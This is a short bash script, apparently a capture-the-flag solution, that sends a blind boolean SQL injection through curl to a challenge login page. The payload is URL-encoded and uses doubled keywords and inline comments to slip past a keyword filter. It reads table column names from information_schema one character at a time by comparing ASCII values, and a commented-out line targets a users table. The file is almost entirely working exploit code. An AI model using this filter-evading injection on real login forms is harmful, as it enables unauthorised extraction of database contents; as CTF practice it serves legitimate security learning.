#!/bin/bash
charIndex=$1
charValue=$2
columnIndex=$3
result=$(curl 'https://sqli.chal.h4ck3r.quest/login' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'sec-ch-ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: https://sqli.chal.h4ck3r.quest' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Referer: https://sqli.chal.h4ck3r.quest/' \
  -H 'Accept-Language: en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7' \
  --data-raw "username=%5C&password=%2F**%2Foorr%2F**%2Fascii%28mid%28%28SESELECTLECT%2F**%2Fcolumn_name%2F**%2FFROM%2F**%2Finfoorrmation_schema.columns%2F**%2FWHWHEREERE%2F**%2Ftable_schema%2F**%2FLIKE%2F**%2Fdatabase%28%29%2F**%2Faandnd%2F**%2Ftable_name%2F**%2FLIKE%2F**%2F0x6833795F686572655F31355F7468655F666C61675F7930755F77346E742C6D656F772C666C6167%2F**%2FLIMIT%2F**%2F${columnIndex}%2C1%29%2C${charIndex}%2C${charIndex}%29%29%2F**%2F%3E%2F**%2F${charValue}%23" \
  --compressed)

# --data-raw "username=%5C&password=%2F**%2Foorr%2F**%2Fascii%28mid%28%28SESELECTLECT%2F**%2Fcolumn_name%2F**%2FFROM%2F**%2Finfoorrmation_schema.columns%2F**%2FWHWHEREERE%2F**%2Ftable_schema%2F**%2FLIKE%2F**%2Fdatabase%28%29%2F**%2Faandnd%2F**%2Ftable_name%2F**%2FLIKE%2F**%2F0x7573657273%2F**%2FLIMIT%2F**%2F${columnIndex}%2C1%29%2C${charIndex}%2C${charIndex}%29%29%2F**%2F%3E%2F**%2F${charValue}%23" \

if [ "$result" = "Welcome!" ];then
  echo "welcome!!!!!"
  exit 0
else
  echo "fail111"
  exit 1
fi